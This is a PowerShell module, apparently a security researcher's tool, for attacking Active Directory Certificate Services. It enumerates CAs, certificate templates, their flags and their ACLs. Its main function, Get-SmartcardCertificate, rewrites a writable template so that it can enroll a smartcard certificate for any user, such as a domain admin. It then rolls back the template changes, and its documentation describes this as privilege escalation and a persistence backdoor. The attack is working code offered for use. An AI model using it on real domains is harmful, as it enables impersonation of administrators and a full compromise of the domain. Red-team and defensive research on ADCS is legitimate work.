<#
https://github.com/cfalta/PoshADCS

PoshADCS

PoshADCS is the result of my current research in finding attack paths against an Active Dircetory Domain through ADCS (Active Directory Certificate Services). The script is still in a very beta-stage at the moment so use it only if you know what you are doing.
TL;DR;

Active Directory integrated Certificate Authorities (Enterprise CAs) store a part of their configuration in Active Directory. Espescially of interest are the so called "Certificate Templates". Certificate templates are used by clients als well as by the CA to determine how to populate the fields in a certificate request as well as the resulting certificate. Usually there are a couple of published certificate templates in any organization that uses an AD integrated CA. If an attacker gains write access (Write and Enroll or WriteDACL) on any of these templates (e.g. through a service account) it is possible to "rewrite" any template so the attacker can enroll a smart card certificate for arbitrary users (e.g. domain admin) and then impersonate that user. This can be used as an ACL-based backdoor as well as an offensive attack vector.
What's ADCS?

Active Directory Service Certificates is a server-role for Windows server that allows you to run a PKI (Public Key Infrastructure) on Windows. Upon installation, you can decide if you want to install a standalone or an enterprise CA. Simply put: a standalone CA is just a certificate authority running on Windows, whereas an enterprise CA integrates with Active Directory. You typically use the standalone CA for your root CA (because in can be offline or disconnected) and the enterprise CA for the issuing CA. So what does "enterprise" and "integrated" mean specifically?

#>
function Get-RootCA
{
<#
.SYNOPSIS

Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration....

Author: Christoph Falta (@cfalta)

.LINK

https://github.com/cfalta/PoshADCS

#>
    $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
    $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
    $RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter "(objectclass=certificationAuthority)"
    $RootCA
}

function Get-EnterpriseCA
{
<#
.SYNOPSIS

Just a shortcut to PowerViews Get-DomainObject that retrieves Enterprise CAs from the default location at CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration....

Author: Christoph Falta (@cfalta)

.LINK

https://github.com/cfalta/PoshADCS

#>
    $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
    $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
    $EnterpriseCA = Get-DomainObject -SearchBase ("CN=Enrollment Services," + $BasePath) -LDAPFilter "(objectclass=pKIEnrollmentService)"
    $EnterpriseCA
}

function Convert-ADCSPrivateKeyFlag
{

<#
.SYNOPSIS

Converts the mspki-private-key-flag specified by the "Flag" parameter.

Author: Christoph Falta (@cfalta)

.PARAMETER Flag

The value to translate.

.EXAMPLE

Convert-ADCSPrivateKeyFlag -Flag 1

Description
-----------

Translates the value "1" according to microsoft documentation.

.LINK

https://github.com/cfalta/PoshADCS

#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Flag
    )

# Based on 2.27 msPKI-Private-Key-Flag Attribute
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/f6122d87-b999-4b92-bff8-f465e8949667

$Result = @()

$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')

if($BitFlag.Substring(31,1) -eq '1')
{
    $Result += "CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL"
}

if($BitFlag.Substring(27,1) -eq '1')
{
    $Result += "CT_FLAG_EXPORTABLE_KEY"
}

if($BitFlag.Substring(26,1) -eq '1')
{
    $Result += "CT_FLAG_STRONG_KEY_PROTECTION_REQUIRED"
}

if($BitFlag.Substring(25,1) -eq '1')
{
    $Result += "CT_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM"
}

if($BitFlag.Substring(24,1) -eq '1')
{
    $Result += "CT_FLAG_REQUIRE_SAME_KEY_RENEWAL"
}

if($BitFlag.Substring(23,1) -eq '1')
{
    $Result += "CT_FLAG_USE_LEGACY_PROVIDER"
}

if($BitFlag -eq '00000000000000000000000000000000')
{
    $Result += "CT_FLAG_ATTEST_NONE"
}

if($BitFlag.Substring(18,1) -eq '1')
{
    $Result += "CT_FLAG_ATTEST_REQUIRED"
}

if($BitFlag.Substring(19,1) -eq '1')
{
    $Result += "CT_FLAG_ATTEST_PREFERRED"
}

if($BitFlag.Substring(17,1) -eq '1')
{
    $Result += "CT_FLAG_ATTESTATION_WITHOUT_POLICY"
}

if($BitFlag.Substring(22,1) -eq '1')
{
    $Result += "CT_FLAG_EK_TRUST_ON_USE"
}

if($BitFlag.Substring(21,1) -eq '1')
{
    $Result += "CT_FLAG_EK_VALIDATE_CERT"
}
if($BitFlag.Substring(20,1) -eq '1')
{
    $Result += "CT_FLAG_EK_VALIDATE_KEY"
}

$Result

}
function Convert-ADCSNameFlag
{
<#
.SYNOPSIS

Converts the mspki-certificate-name-flag specified by the "Flag" parameter.

Author: Christoph Falta (@cfalta)

.PARAMETER Flag

The value to translate.

.EXAMPLE

Convert-ADCSNameFlag -Flag 1

Description
-----------

Translates the value "1" according to microsoft documentation.

.LINK

https://github.com/cfalta/PoshADCS

#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Flag
    )

# Based on 2.28 msPKI-Certificate-Name-Flag Attribute
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1

$Result = @()

$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')

if($BitFlag.Substring(31,1) -eq '1')
{
    $Result += "ENROLLEE_SUPPLIES_SUBJECT"
}

if($BitFlag.Substring(28,1) -eq '1')
{
    $Result += "OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME"
}

if($BitFlag.Substring(15,1) -eq '1')
{
    $Result += "ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME"
}

if($BitFlag.Substring(9,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DOMAIN_DNS"
}

if($BitFlag.Substring(7,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DIRECTORY_GUID"
}

if($BitFlag.Substring(6,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_UPN"
}

if($BitFlag.Substring(5,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_EMAIL"
}

if($BitFlag.Substring(4,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DNS"
}

if($BitFlag.Substring(3,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_DNS_AS_CN"
}

if($BitFlag.Substring(2,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_EMAIL"
}

if($BitFlag.Substring(1,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_COMMON_NAME"
}

if($BitFlag.Substring(0,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_DIRECTORY_PATH"
}

$Result

}

function Convert-ADCSEnrollmentFlag
{
<#
.SYNOPSIS

Converts the mspki-enrollment-flag specified by the "Flag" parameter.

Author: Christoph Falta (@cfalta)

.PARAMETER Flag

The value to translate.

.EXAMPLE

Convert-ADCSEnrollmentFlag -Flag 1

Description
-----------

Translates the value "1" according to microsoft documentation.

.LINK

https://github.com/cfalta/PoshADCS

#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Flag
    )

# Based on 2.26 msPKI-Enrollment-Flag Attribute
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1

$Result = @()

$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')

if($BitFlag.Substring(31,1) -eq '1')
{
    $Result += "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
}

if($BitFlag.Substring(30,1) -eq '1')
{
    $Result += "CT_FLAG_PEND_ALL_REQUESTS"
}

if($BitFlag.Substring(29,1) -eq '1')
{
    $Result += "CT_FLAG_PUBLISH_TO_KRA_CONTAINER"
}

if($BitFlag.Substring(28,1) -eq '1')
{
    $Result += "CT_FLAG_PUBLISH_TO_DS"
}

if($BitFlag.Substring(27,1) -eq '1')
{
    $Result += "CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE"
}

if($BitFlag.Substring(26,1) -eq '1')
{
    $Result += "CT_FLAG_AUTO_ENROLLMENT"
}
if($BitFlag.Substring(25,1) -eq '1')
{
    $Result += "CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT"
}

if($BitFlag.Substring(23,1) -eq '1')
{
    $Result += "CT_FLAG_USER_INTERACTION_REQUIRED"
}

if($BitFlag.Substring(21,1) -eq '1')
{
    $Result += "CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE"
}

if($BitFlag.Substring(20,1) -eq '1')
{
    $Result += "CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF"
}

if($BitFlag.Substring(19,1) -eq '1')
{
    $Result += "CT_FLAG_ADD_OCSP_NOCHECK"
}

if($BitFlag.Substring(18,1) -eq '1')
{
    $Result += "CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL"
}

if($BitFlag.Substring(17,1) -eq '1')
{
    $Result += "CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS"
}

if($BitFlag.Substring(16,1) -eq '1')
{
    $Result += "CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS"
}

if($BitFlag.Substring(15,1) -eq '1')
{
    $Result += "CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT"
}

if($BitFlag.Substring(14,1) -eq '1')
{
    $Result += "CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST"
}

$Result

}


function Convert-ADCSFlag
{
<#
.SYNOPSIS

Translates the value of a specified flag-attribute into a human readable form.

Author: Christoph Falta (@cfalta)

.PARAMETER Attribute

The flag attribute to translate. Can be one of "mspki-enrollment-flag", "mspki-certificate-name-flag" or "mspki-private-key-flag".

.PARAMETER Value

The value to translate.

.EXAMPLE

Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value 1

Description
-----------

Converts the value 1 of the attribute mspki-enrollment-flag into a human readable form.

.LINK

https://github.com/cfalta/PoshADCS

#>

        [CmdletBinding()]
        Param (
        [Parameter(Mandatory = $true)]
        [ValidateSet("mspki-enrollment-flag","mspki-certificate-name-flag","mspki-private-key-flag")]
        [string]
        $Attribute,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Value)

switch($Attribute)
{
    "mspki-enrollment-flag" { Convert-ADCSEnrollmentFlag -Flag $Value }
    "mspki-certificate-name-flag"{ Convert-ADCSNameFlag -Flag $Value }
    "mspki-private-key-flag"{ Convert-ADCSPrivateKeyFlag -Flag $Value }
}


}


function Get-ADCSTemplateACL 
{
<#
.SYNOPSIS

Get-ADCSTemplateACL uses PowerViews Get-DomainObjectACL to retrieve the ACLs of a single or all certificate templates. 
Use the filter switch to remove ACEs that match admin groups or other default groups to reduce the output and gain better visibility.

Author: Christoph Falta (@cfalta)

.PARAMETER Name

The name of the certificate template to search for. If omitted, all templates will be retrieved.

.PARAMETER Filter

Filter the ACEs to reduce output and gain better visibility.

-Filter AdminACEs --> will remove ACEs that match to default admin groups (e.g. Domain Admins)
-Filter DefaultACEs --> will remove ACEs that match to default domain groups including admin groups (e.g. Domain Admins, Authenticated Users,...)

.EXAMPLE

Get-ADCSTemplateACL -Name Template1 -Filter DefaultACEs

Description
-----------

Get's the ACEs of the template with name "Template1" and removes all default ACEs

.EXAMPLE

Get-ADCSTemplateACL -Filter AdminACEs

Description
-----------

Get's the ACEs of all templates and removes admin ACEs

.LINK

https://github.com/cfalta/PoshADCS

#>

        [CmdletBinding()]
        Param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,
        
        [Parameter(Mandatory = $false)]
        [ValidateSet("AdminACEs","DefaultACEs")]
        [String]
        $Filter)
        

$DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

$SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
$SearcherArguments.Add("LDAPFilter","(objectclass=pKICertificateTemplate)")
if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") }

$TemplatesACL = Get-DomainObjectACL @SearcherArguments -Resolveguids

foreach($acl in $TemplatesACL)
{
    $acl | Add-Member -MemberType NoteProperty -Name Identity -Value (Convert-SidToName $acl.SecurityIdentifier)
}

if($Filter -eq "AdminACEs")
{
    $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9")) }
}
if($Filter -eq "DefaultACEs")
{
    $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9") -or ($_.SecurityIdentifier.value -eq "S-1-5-11") -or ($_.SecurityIdentifier.value -like "*-513") -or ($_.SecurityIdentifier.value -like "*-515") -or ($_.SecurityIdentifier.value -like "*-553")) } 
}

$TemplatesACL

}

function Get-ADCSTemplate
{
<#
.SYNOPSIS

This function gets a specified or all objects of type "pKICertificateTemplate" stored under the default path CN=Certificate Templates... from Active Directory using PowerViews Get-DomainObject.
It can also translate the various flag attributes to human-readable values and include the ACLs of the template objects.

Author: Christoph Falta (@cfalta)

.PARAMETER Name

The name of the certificate template to search for. If omitted, all templates will be retrieved.

.PARAMETER ResolveFlags

Instructs the script to translate the flag attributes to human readable values.

.PARAMETER IncludeACL

Includes the ACLs as of the template in the returned template object.

.EXAMPLE

Get-ADCSTemplate -ResolveFlags

Description
-----------

Get's all templates and resolves flags.

.EXAMPLE

Get-ADCSTemplate -Name Template1 -ResolveFlags

Description
-----------

Get's the template with the name "Template1" and resolves flags.

.LINK

https://github.com/cfalta/PoshADCS

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $ResolveFlags,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $IncludeACL,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $Raw
    )

$DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

$SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
$SearcherArguments.Add("LDAPFilter","(objectclass=pKICertificateTemplate)")
if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") }
if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }

$Templates = Get-DomainObject @SearcherArguments


if($IncludeACL)
{
    $TemplatesACL = Get-ADCSTemplateACL

    foreach($t in $Templates)
    {
        $ACEs = $TemplatesACL | ? {$_.ObjectDN -eq $t.distinguishedname}
        $t | Add-Member -MemberType NoteProperty -Name "ACL" -Value $ACEs
    }
}

if($ResolveFlags)
{

    foreach($t in $Templates)
    {
        $CertificateNameFlag = Convert-ADCSFlag -Attribute mspki-certificate-name-flag -Value $t.'mspki-certificate-name-flag'
        if($CertificateNameFlag)
        {
            $t | Add-Member -MemberType NoteProperty -Name "CertificateNameFlag" -Value $CertificateNameFlag
        }

        $EnrollmentFlag = Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value $t."mspki-enrollment-flag"
        if($EnrollmentFlag)
        {
            $t | Add-Member -MemberType NoteProperty -Name "EnrollmentFlag" -Value $EnrollmentFlag
        }

        $PrivateKeyFlag = Convert-ADCSFlag -Attribute mspki-private-key-flag -Value $t."mspki-private-key-flag"
        if($PrivateKeyFlag)
        {
            $t | Add-Member -MemberType NoteProperty -Name "PrivateKeyFlag" -Value $PrivateKeyFlag
        }
    }

}

$Templates

}


function Set-ADCSTemplate
{
<#
.SYNOPSIS

This function basically is a wrapper around PowerViews Set-Domainobject. The major difference is that it will store the current values of all attributes that should be changed in a global state variable called $global:ADCSTEMPLATESETTINGS.
Therefore it is very easy to change multiple attributes on a certificate template and automatically reset it after you are done.

Author: Christoph Falta (@cfalta)

.PARAMETER Name

The name of the certificate template to change.

.PARAMETER Properties

A variable of type hashtable containing the attributes you want to change. Have a look at Get-SmartcardCertificate for inspiration.

.PARAMETER Force

Overwrites an existing state variable. Otherwise, the script will not run if a state variable exists to make sure that you don't loose data.

.EXAMPLE

$Properties = @{}
$Properties.Add('mspki-certificate-name-flag',1)
$Properties.Add('flags','CLEAR')

Set-ADCSTemplate -Name CorpComputer -Properties $Properties

Description
-----------

The command above will set the mspki-certificate-name-flag to 1 and clear the flags attribute on the template named CorpComputer

.LINK

https://github.com/cfalta/PoshADCS

#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [Hashtable]
        $Properties,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $Force

        )

$Domain = (Get-Domain).Name    
$DomainName = "DC=" + $Domain.Replace(".",",DC=")
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

if($Global:ADCSTEMPLATESETTINGS -and -not $Force)
{
    Write-Warning "Global state variable exists. If you go on, you may loose old data. Use -Force to override"
}
else {
        $Global:ADCSTEMPLATESETTINGS = @{}
        $template = Get-ADCSTemplate -Name $Name -Raw
        $entry = $template.GetDirectoryEntry()
        $Properties.GetEnumerator() | ForEach-Object {
            try{
                $value = $entry.Get($_.Key)
                if($value.gettype().Name -eq "Int32")
                {
                    $value = $value.ToString()
                }
            }
            catch
            {
                $value = "CLEAR"
            }
            $Global:ADCSTEMPLATESETTINGS.Add($_.Key,$value)
        }
        foreach($p in $Properties.GetEnumerator())
        {
                if($p.Value -eq "CLEAR")
                {
                    Set-DomainObject -Identity $Name -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Clear $p.Key
                }
                else 
                {
                    Set-DomainObject -Identity $Name -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value}
                }

        }
    }

}

function Reset-ADCSTemplate
{
<#
.SYNOPSIS

Reset-ADCSTemplate just calls Set-ADCSTemplate but uses the global environment variable ADCSTEMPLATESETTINGS as input. The variable is cleared after execution.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

This function is used to automatically reset a certificate template to the state before Set-ADCSTemplate was called. The script assumes write permissions.

.PARAMETER TemplateName

The name of the certificate template to use.

.EXAMPLE

Reset-ADCSTemplate -Name CorpComputer

Description
-----------

Resets the attribute values stored in $global:ADCSTEMPLATESETTINGS on the template CorpComputer.

.LINK

https://github.com/cfalta/PoshADCS

#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name)

        if(-not $Global:ADCSTEMPLATESETTINGS)
        {
            Write-Warning "No state variable found. Nothing to reset."
        }
        else
        {
            Set-ADCSTemplate -Name $Name -Properties $Global:ADCSTEMPLATESETTINGS -Force
            $Global:ADCSTEMPLATESETTINGS = ""
        }
}
function Get-SmartcardCertificate{
<#
.SYNOPSIS

Get-SmartCardCertificate allows you to get a Smartcard Certificate from a Windows Enterprise CA for a specified user account by rewriting an arbitrary certificate template that the executing user has write access on. 
This can be used as method of domain wide privilege escalation (think domain admin) as well as a long-term persistence method. This script heavily relies on PowerView by Will Schroeder.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-SmartCardCertificate will change various attributes in the certificate template defined by the "TemplateName" parameter to make it possible to request a smartcard certificate for the user specified by the parameter "Identity".
It will then request this certifiate automatically using COM/MS-WCCP protocol and store it in a smartcard that needs to be present on the system executing this script.
Changes to the certificate template will be rolled back automatically at the end of the script.

.PARAMETER Identity

The user to request a smartcard certificate for.

.PARAMETER TemplateName

The template to rewrite. Note that the script assumes that you have write permissions on the template.

.PARAMETER NoSmartcard

Instructs the script to use the default CSP during enrollment. This will result in the certificate being stored in the default user cert store and not on a smartcard.
Use this if you have no smartcard or just want a PoC.

.EXAMPLE

Get-SmartcardCertificate -Identity domadm -TemplateName CorpComputer

Description
-----------

Requests a smartcard certificate for the user domadm using the template CorpComputer.

.LINK

https://github.com/cfalta/PoshADCS

#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Identity,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $TemplateName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $NoSmartcard)



$STOPERROR = $false

$user = Get-DomainObject -Identity $Identity

if(-not $user)
{
    Write-Warning "User $($Identity) does not exist."
    $STOPERROR = $true
}
else {
    $TargetUPN = $user.userprincipalname
    if(-not $TargetUPN)
    {
        Write-Warning "User $($Identity) does not have a UPN."
        $STOPERROR = $true
    }
}
if(-not (Get-ADCSTemplate -Name $TemplateName))
{
    Write-Warning "Template $($TemplateName) does not exist."
    $STOPERROR = $true
}

if(-not $STOPERROR)
{
    $Properties = @{}
    $Properties.Add('mspki-certificate-name-flag',1)
    $Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
    $Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
    $Properties.Add('flags','CLEAR')
    $Properties.Add('mspki-enrollment-flag',0)
    $Properties.Add('mspki-private-key-flag',256)
    $Properties.Add('pkidefaultkeyspec',1)

    if($PSBoundParameters['NoSmartcard'])
    {
        $Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')
        $Properties.'mspki-private-key-flag' += 16
    }
    else
    {
        $Properties.Add('pKIDefaultCSPs','1,Microsoft Base Smart Card Crypto Provider')
    }

    Write-Verbose "Changing template $TemplateName into a smartcard template"
    Set-ADCSTemplate -Name $TemplateName -Properties $Properties -Force

    Write-Verbose "Requesting certificate for $($TargetUPN)"

    $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
    $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
    $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
    $IAN.InitializeFromString(0xB,$TargetUPN)
    $IANs.Add($IAN)
    $SAN.InitializeEncode($IANs)
    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromTemplateName(0x1,$TemplateName)
    $Request.Request.X509Extensions.Add($SAN)
    $Request.CertificateFriendlyName = $TemplateName
    $Request.Enroll()

    Write-Verbose "Rolling back changes to template. Nothing happend here..."
    Reset-ADCSTemplate -Name $TemplateName

}

}

function New-VirtualSmartcard
{
<#
.SYNOPSIS

Simple PowerShell wrapper around tpmvscmgr.exe.

Author: Christoph Falta (@cfalta)

.EXAMPLE

New-VirtualSmartcard

Description
-----------

Creates a virtual smartcard with a default pin and a random name prefixed with "VSC"

.LINK

https://github.com/cfalta/PoshADCS

#>

    $VSCName = "VSC" + (get-random -Minimum 1000 -Maximum 9999).ToString()   
    $VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generate"

    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = "C:\Windows\System32\tpmvscmgr.exe"
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = $VSCArgs
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $pinfo
    $p.Start() | Out-Null
    $p.WaitForExit()
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    if($stderr)
    {
        Write-Warning "An error occurred during VSC generation."
        Write-Warning $stderr
    }
    else {
        Write-Output "Virtual smartcard $($VSCName) created"
        Write-Output "Pin: 12345678"
    }
}

function Get-VirtualsmartCard
{
<#
.SYNOPSIS

Simple wrapper around Get-WmiObject so you dont have to remember the class guid ;-)

Author: Christoph Falta (@cfalta)

.LINK

https://github.com/cfalta/PoshADCS

#>
    Get-wmiobject win32_PnPEntity | ? {$_.ClassGuid -eq "{50DD5230-BA8A-11D1-BF5D-0000F805F530}"} | select-object Name, Description, DeviceID
}

function Remove-VirtualsmartCard
{
<#
.SYNOPSIS

Simple wrapper around tpmvscmgr.exe to remove a VSC by ID.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Simple wrapper around tpmvscmgr.exe to remove a VSC by name.

.PARAMETER DeviceID

The ID of the virtual smartcard device.

.EXAMPLE

Remove-VirtualSmartcard -DeviceID ROOT\SMARTCARDREADER\0000

Description
-----------

Removes the virtual smartcard with the ID ROOT\SMARTCARDREADER\0000

.LINK

https://github.com/cfalta/PoshADCS

#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [String]
        $DeviceID)

    if($PSBoundParameters['DeviceID'])
    {
        $VSC = Get-VirtualSmartCard | ? {$_.DeviceID -eq $DeviceID}
    }
    else
    {
        $VSC = Get-VirtualSmartCard
    }

    if(-not $VSC)
    {
        Write-Warning "Virtual Smartcard not found."
    }
    else {
        
        foreach($v in $VSC)
        {
            $VSCArgs = "destroy /instance " + $v.DeviceID

            $pinfo = New-Object System.Diagnostics.ProcessStartInfo
            $pinfo.FileName = "C:\Windows\System32\tpmvscmgr.exe"
            $pinfo.RedirectStandardError = $true
            $pinfo.RedirectStandardOutput = $true
            $pinfo.UseShellExecute = $false
            $pinfo.Arguments = $VSCArgs
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo = $pinfo
            $p.Start() | Out-Null
            $p.WaitForExit()
            $stdout = $p.StandardOutput.ReadToEnd()
            $stderr = $p.StandardError.ReadToEnd()

            if($stderr)
            {
                Write-Warning "An error occurred."
                Write-Verbose $stderr
            }
            else {
                Write-Output "Virtual smartcard $($v.DeviceID) deleted"
            }
        }
    }
}
